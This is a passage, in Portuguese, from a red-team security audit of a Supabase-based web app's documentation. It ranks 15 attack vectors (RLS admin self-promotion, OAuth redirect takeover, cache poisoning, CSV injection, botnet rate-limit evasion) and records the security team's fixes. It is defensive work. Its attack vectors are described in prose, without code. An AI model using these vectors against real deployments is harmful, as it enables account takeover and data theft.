- **Tiro proveito do "descarte silencioso" do honeypot**: o descarte não gera log/alert (por design), então **campanhas de ataque em andamento são invisíveis** até o estrago.
- **Esgoto o pool do Supabase**: picos de conexões serverless + queries pesadas (ex.: `limit` alto na REST) → exaustão de conexões/quota → **indisponibilidade para usuários legítimos** (availability).

**Por que a doc atual falha.** ST-023/061 testam volume por IP, não **limites globais/diários** nem detecção distribuída. HC-025/026/031 são por-IP. Não há caso de teste para fingerprint de bot headless com distribuição (Turnstile ajuda, mas a doc diz "nunca depender só de CAPTCHA" e não prevê segunda camada). Não há alerta de honeypot.

**Recomendação.** Adicionar: **limite global diário** de submissões (bucket no banco/Supabase Edge Function) com alerta; **telemetria de honeypot** (contador de descartes → alerta de campanha); fingerprinting de navegador/Turnstile score como sinal (sem depender só do token); quota de conexões por função com pooling. Adicionar **ST-103**: simular botnet distribuída (10 IPs × 5/h) → o limite global dispara e o alerta de honeypot/campanha é emitido; **HC-099**: monitor de conexões/quota do Supabase com alerta a 80%.

---

## 4. Priorização das Lacunas

| ID | Vetor | Fase afetada | Severidade | Urgência | Esforço estimado |
|---|---|---|---|---|---|
| RT-002 | Auto-promoção a admin via RLS `FOR ALL` em `usuarios_admin` | 2 | **Crítico** | Bloqueia a fase 2 (corrigir design RLS antes de codar) | Pequeno |
| RT-004 | Account takeover via OAuth/magic link (`redirect_uri`/`redirect_to`) | 2 | **Crítico** | Antes do desenvolvimento da fase 2 | Médio |
| RT-005 | Brute force/credential stuffing/email bombing direto no Supabase Auth | 2 | **Crítico** | Antes do desenvolvimento da fase 2 | Médio |
| RT-001 | Bypass WAF/Turnstile/rate-limit via REST do Supabase com anon key | 1–3 | **Alto** | **Antes do lançamento fase 1** (testes de grants/RLS) | Pequeno |
| RT-003 | Mass assignment/tamper de `status`/`criado_em` derrota TTL de retenção LGPD | 1 | **Alto** | **Antes do lançamento fase 1** | Pequeno |
| RT-006 | Cache poisoning / Web Cache Deception / SWR no CDN | 1–2 | **Alto** | **Antes do lançamento fase 1** (blog ISR já existe) | Médio |
| RT-008 | Exportação LGPD: CSV injection, path traversal, link sem escopo | 1 | **Alto** | **Antes do lançamento fase 1** (endpoint LGPD) | Médio |
| RT-010 | Form abuse → phishing interno + esgotamento de quota Resend | 1 | **Alto** | **Antes do lançamento fase 1** | Médio |
| RT-012 | PII/IP/token em logs de terceiros (Sentry/Cloudflare/Vercel) | 1 | **Alto** | **Antes do lançamento fase 1** (LGPD) | Médio |
| RT-007 | Abuso do webhook CRM (replay, contatos falsos, SSRF) | 3 | **Alto** | Antes do desenvolvimento da fase 3 | Médio |
| RT-013 | Stored XSS via Markdown no blog | 2 | **Alto** | Antes do desenvolvimento da fase 2 | Pequeno |
| RT-009 | Enumeração de assinantes/estados + brute force de token de newsletter | 1 | **Médio** | Antes do lançamento fase 1 | Pequeno |
| RT-011 | JWT/sessão forjado (`alg` confusion, claims não validados) | 2 | **Médio** | Antes do desenvolvimento da fase 2 | Pequeno |
| RT-014 | Subdomain takeover (CNAMEs órfãos) + inconsistência de domínio | 1–3 | **Médio** | Antes do lançamento fase 1 (auditoria DNS) | Pequeno |
| RT-015 | Rate limit distribuído/global ausente + DoS de custo | 1 | **Médio** | Antes do lançamento fase 1 | Médio |

**Resumo:** 3 Críticos (todos de fases futuras, mas **bloqueadores de design**), 8 Altos, 4 Médios. Para a fase 1, os itens **Altos RT-001, RT-003, RT-006, RT-008, RT-010, RT-012** + os Médios RT-009, RT-014 e RT-015 devem constar como **critério de entrada** no gate de release do HC (além do critério atual "100% dos casos críticos/altos PASS").

---

## 5. Recomendações Finais

### Correções imediatas de consistência (antes de qualquer release)
1. **Criar a tabela de registro de consentimento** no modelo de dados (append-only, com `consent_version`, `consented_at`, `ip_hash`, `form_origin`), exigida por ST-077/078 e HC-057/HC-077. Sem ela, os casos de teste LGPD do doc 02 **não são executáveis** e a base legal de consentimento fica frágil.
2. **Padronizar o domínio canônico** em todos os documentos (`eliora.com.br` vs `eliora-rh.com.br`) e auditar o DNS real em produção.
3. **Corrigir a política RLS de `usuarios_admin`** (RT-002): nunca `FOR ALL` com `WITH CHECK` permissivo em tabela de privilégio; INSERT só via `service_role`.

### Entrar no doc `02-casos-teste-seguranca.md` (novos ST)
- ST-086 (grants/RLS por role no banco), ST-087 (INSERT/UPDATE/DELETE como `authenticated` em `usuarios_admin`), ST-088 (mass assignment com `status`/`criado_em`), ST-089 (OAuth redirect), ST-090/091 (auth direto no Supabase), ST-092 (cache poisoning por header), ST-093/094 (webhook CRM replay/SSRF), ST-095/096 (exportação LGPD), ST-097 (token de confirmação), ST-098 (quota Resend/circuit breaker), ST-099 (JWT forjado), ST-100 (token em query string/logs), ST-101 (XSS em Markdown), ST-102 (CNAMEs órfãos), ST-103 (rate limit distribuído/global).

### Entrar no doc `03-checklist-hardening.md` (novos HC)
- HC-093 (auditoria trimestral de grants), HC-094 (auditoria de policies por `cmd`), HC-095 (TTL robusto a tamper), HC-096 (Redirect URLs do Supabase), HC-097 (acesso a logs com PII), HC-098 (dangling CNAMEs/DNSSEC), HC-099 (monitor de quota/conexões Supabase e Resend).
- Novos itens: `Cache-Control: no-store` em rotas autenticadas; redação de PII/query strings no Sentry; signup público desabilitado; CAPTCHA no auth.

### Atualizar `01-politica-seguranca.md`
- Adicionar seção de **Supabase como superfície de ataque direta** (anon key, REST/Auth, grants) — hoje o modelo de ameaças trata o banco só por dentro da app.
- Detalhar controles de **OAuth/magic link** (allowlist de redirect, PKCE) na mitigação de Spoofing.
- Incluir **cost/billing DoS** e fluxos de PII para **processadores** (Sentry, Vercel/Cloudflare logs) no modelo de ameaças e no registro de tratamento.
- Prever reavaliação do modelo de ameaças a cada fase (2 e 3).

### Processo
- Incluir os novos ST/HC como **critério de entrada** do gate de release (RT-001, RT-003, RT-006, RT-008, RT-010, RT-012 bloqueiam fase 1).
- Agendar **reteste de red team** ao concluir as fases 2 e 3 (auth/admin e portal/CRM), pois 5 vetores críticos/altos concentram-se nelas.
- Tratar a recomendação de **role Postgres próprio com grants mínimos** em vez do `service_role` onipresente como item de médio prazo (reduz o impacto de vazamento da chave).

---

## 6. Decisões de segurança aplicadas (resposta ao red team)

> Seção adicionada em **v1.1** pela Equipe de Segurança após revisão dos achados. Os 15 vetores foram avaliados individualmente; os confirmados receberam correção concreta na documentação (modelo de dados, casos de teste, checklist e política), com referência cruzada aos novos ST-086 a ST-103 e HC-093 a HC-106.

| RT | Veredito | Justificativa | Correção aplicada na documentação | Status |
|---|---|---|---|---|
| RT-001 | **CONFIRMADO** | A `anon key` é exposta no bundle e o PostgREST é alcançável sem WAF/rate limit; nenhum caso de teste atacava o Supabase diretamente | `03-modelo-dados` §0.1: grants default-deny (`REVOKE ALL` + grants mínimos) e `REVOKE` em todas as tabelas; ST-086; HC-093; política §2.6 (superfície direta); CI com testes de RLS por role | **CORRIGIDO NA DOC** |
| RT-002 | **CONFIRMADO** | Policy `admin_self` sem `FOR` = `FOR ALL`, permitindo INSERT de auto-promoção a admin | `03-modelo-dados` §5: `FOR SELECT`/`FOR UPDATE` separados, sem política de INSERT, `REVOKE INSERT` e trigger `guardar_usuarios_admin`; ST-087; HC-094 | **CORRIGIDO NA DOC** |
| RT-003 | **CONFIRMADO** | Mass assignment de `status`/`criado_em` derrota o TTL de retenção LGPD | `03-modelo-dados` §1: trigger `normalizar_contato_mensagens` (`status='novo'`, `criado_em=now()`); política §3.2/§4.1: whitelist de campos (zod `.strict()`/`.pick()`); ST-088; HC-095 | **CORRIGIDO NA DOC** |
| RT-004 | **CONFIRMADO** | OAuth/magic link com `redirect_uri`/`redirect_to` aberto leva a account takeover (fase 2) | Política §2.5/§4.3: allowlist de redirect (sem wildcards), PKCE obrigatório; ST-089; HC-096 | **CORRIGIDO NA DOC** (pré-requisito fase 2) |
| RT-005 | **CONFIRMADO** | `/auth/v1` direto escapa do rate limit da aplicação (brute force/email bombing) | Política §2.6/§4.3: signup público desabilitado, CAPTCHA/Turnstile no auth, mediador de login; ST-090/091; HC-103 | **CORRIGIDO NA DOC** (pré-requisito fase 2) |
| RT-006 | **CONFIRMADO** | Cache/CDN pode expor PII e ser envenenado; sem `no-store` em rotas autenticadas | Política §3.2/§4.4: `Cache-Control: no-store, private`, cache key = Host+path, `Vary` correto; ST-092; HC-100 | **CORRIGIDO NA DOC** |
| RT-007 | **CONFIRMADO** | Webhook CRM sem casos de replay/SSRF/assinatura em tempo constante (fase 3) | `03-modelo-dados` §6: payload validado e destino fixo; ST-093/094 | **CORRIGIDO NA DOC** (pré-requisito fase 3) |
| RT-008 | **CONFIRMADO** | CSV/Formula injection e link de exportação sem escopo/expiração | Política §3.2: sanitização de células (`= + - @`, tab/CR), nome fixo `export-lgpd-<uuid>.csv`, URL assinada com expiração; ST-095/096; HC-101 | **CORRIGIDO NA DOC** |
| RT-009 | **CONFIRMADO** | Token de newsletter com replay, brute force e vazamento via query string | Política §4.2: CSPRNG 32 bytes, expiração 48h, invalidação pós-uso, entrega por POST/fragmento; ST-097; HC-106 | **CORRIGIDO NA DOC** |
| RT-010 | **CONFIRMADO** | Form abuse esgota a quota do Resend e viabiliza phishing interno | Política §2.5/§4.1: rate limit global diário + circuit breaker, `from`/`reply-to` fixos, corpo em texto puro; ST-098; HC-099/HC-102 | **CORRIGIDO NA DOC** |
| RT-011 | **CONFIRMADO** | Verificação manual de JWT com `alg` confusion (fase 2) | Política §4.3 + ST-099: usar apenas SDK oficial `@supabase/ssr` ou `jose` com `algorithms`/`aud`/`iss` explícitos | **CORRIGIDO NA DOC** (pré-requisito fase 2) |
| RT-012 | **CONFIRMADO** | PII/IP/token em logs de terceiros contradiz a promessa "IP apenas como hash" | Política §2.6 (processadores) + §3.4: scrubbing no Sentry, DPAs, acesso nominal a logs; ST-100; HC-097 | **CORRIGIDO NA DOC** |
| RT-013 | **CONFIRMADO** | Stored XSS via Markdown sem sanitização (fase 2) | Política §4.4: renderização sem `rehype-raw` ou com `rehype-sanitize` + scheme allowlist; ST-101; HC-105 | **CORRIGIDO NA DOC** (pré-requisito fase 2) |
| RT-014 | **CONFIRMADO** | CNAMEs órfãos/subdomain takeover + inconsistência de domínio entre documentos | ST-102; HC-098 (dangling CNAMEs/DNSSEC); domínio canônico único `eliora-rh.com.br` padronizado | **CORRIGIDO NA DOC** |
| RT-015 | **CONFIRMADO** | Rate limit por-IP contornável por botnet; honeypot sem telemetria; DoS de custo | Política §2.5/§4.1: limite global diário, telemetria de honeypot, monitor de quota/conexões; ST-103; HC-099/HC-102 | **CORRIGIDO NA DOC** |

### Inconsistências de consistência entre documentos

- **A1 — tabela de consentimento inexistente:** **CONFIRMADO**. Criada a tabela `consentimentos` em `03-modelo-dados` (§7) com `titular_id`/`email_hash`, `versao_politica`, `finalidade`, `base_legal`, `form_origin`, `ip_hash`, `user_agent_hash`, `aceito_em`, `criado_em`, RLS **append-only** e TTL de 5 anos. ST-077/078 e HC-077/HC-104 agora são executáveis contra o schema documentado. **CORRIGIDO NA DOC.**
- **A2 — RLS `FOR ALL` em `usuarios_admin`:** **CONFIRMADO**. Política corrigida para `FOR SELECT`/`FOR UPDATE` separados, sem política de INSERT, com `REVOKE INSERT` e trigger `guardar_usuarios_admin` (ver RT-002). **CORRIGIDO NA DOC.**

### Nota sobre vereditos

Nenhum vetor foi **REJEITADO**: os itens de fases futuras (RT-004, RT-005, RT-007, RT-011, RT-013) foram tratados como **pré-requisito de design** — a correção documental está aplicada e o **reteste de red team** deve ocorrer no início do desenvolvimento das fases 2 e 3, conforme §5. Os itens de fase 1 (RT-001, RT-003, RT-006, RT-008, RT-010, RT-012, RT-009, RT-014, RT-015) passam a integrar o **critério de entrada** do gate de release (HC-093 a HC-106 + ST-086 a ST-103).

---

## Anexo A — Rastreabilidade

| Vetor | Doc(s) afetado(s) | ST/HC sugeridos | Status |
|---|---|---|---|
| RT-001 | 02-casos (ausência), 03-checklist, 03-modelo | ST-086, HC-093 | **Corrigido na doc** (§6, v1.1) |
| RT-002 | 03-modelo-dados (design RLS), 03-checklist | ST-087, HC-094 | **Corrigido na doc** — design RLS corrigido (FOR SELECT/UPDATE, sem INSERT) |
| RT-003 | 02-rotas (handler), 03-modelo (TTL), 02-casos | ST-088, HC-095 | **Corrigido na doc** |
| RT-004 | 01-politica, 02-rotas (fase 2) | ST-089, HC-096 | **Corrigido na doc** (pré-requisito fase 2) |
| RT-005 | 03-checklist, 01-politica | ST-090/091 | **Corrigido na doc** (pré-requisito fase 2) |
| RT-006 | 04-infra (cache), 02-casos (ST-065) | ST-092 | **Corrigido na doc** |
| RT-007 | 02-rotas (webhook), 03-modelo | ST-093/094 | **Corrigido na doc** (pré-requisito fase 3) |
| RT-008 | 03-modelo (§8.1), 02-casos (ST-079) | ST-095/096 | **Corrigido na doc** |
| RT-009 | 03-modelo (newsletter), 02-casos | ST-097 | **Corrigido na doc** |
| RT-010 | 01-politica (§4.1), 03-checklist | ST-098 | **Corrigido na doc** |
| RT-011 | 02-rotas (auth), 01-politica | ST-099 | **Corrigido na doc** (pré-requisito fase 2) |
| RT-012 | 01-politica (§5.3), 03-checklist (HC-070), 04-infra | ST-100, HC-097 | **Corrigido na doc** |
| RT-013 | 03-modelo (blog), 02-casos (ST-019) | ST-101 | **Corrigido na doc** (pré-requisito fase 2) |
| RT-014 | 04-infra (DNS), 03-checklist (HC-032) | ST-102, HC-098 | **Corrigido na doc** |
| RT-015 | 03-checklist (rate limit), 01-politica | ST-103, HC-099 | **Corrigido na doc** |

---

## Revisão

| Versão | Data | Alterações | Autor |
|---|---|---|---|
| 1.0 | 2026-08-12 | Versão inicial — auditoria documental de segurança | White Hat Hacker / Red Team |
| 1.1 | 2026-08-13 | Resposta da Equipe de Segurança: §6 "Decisões de segurança aplicadas" confirmando os 15 vetores (RT-001 a RT-015) e as inconsistências A1/A2, com correções aplicadas nos documentos (ST-086 a ST-103, HC-093 a HC-106, tabela `consentimentos`, RLS de `usuarios_admin`, grants default-deny) e Anexo A atualizado | Equipe de Segurança |
